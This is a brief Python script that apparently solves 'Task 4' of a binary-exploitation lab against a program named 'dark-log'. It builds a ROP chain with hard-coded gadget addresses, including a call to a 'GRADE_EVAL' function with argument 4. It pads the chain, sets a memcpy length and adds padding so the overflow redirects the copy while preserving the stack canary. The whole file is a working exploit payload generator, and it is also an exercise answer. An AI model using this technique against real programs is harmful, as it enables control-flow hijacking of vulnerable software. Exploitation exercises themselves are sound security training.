#!/usr/bin/env python3
"""Task 4: redirect dark-log's memcpy destination while preserving its canary."""
import struct
import sys

RET = 0x401835
POP_RDI_RET = 0x4018a3
GRADE_EVAL = 0x401677
MAIN_CONTINUATION = 0x401811
MEMCPY_LEN = 168

chain = struct.pack(
    "<QQQQQ",
    RET,
    POP_RDI_RET,
    4,
    GRADE_EVAL,
    MAIN_CONTINUATION,
)
expression = chain + b"A" * (128 - len(chain))
log_message = b"L" * 128
frame_len = struct.pack("<I", MEMCPY_LEN)
canary_padding = b"P" * 20

payload = expression + log_message + frame_len + canary_padding + b"\n"

sys.stdout.buffer.write(payload)
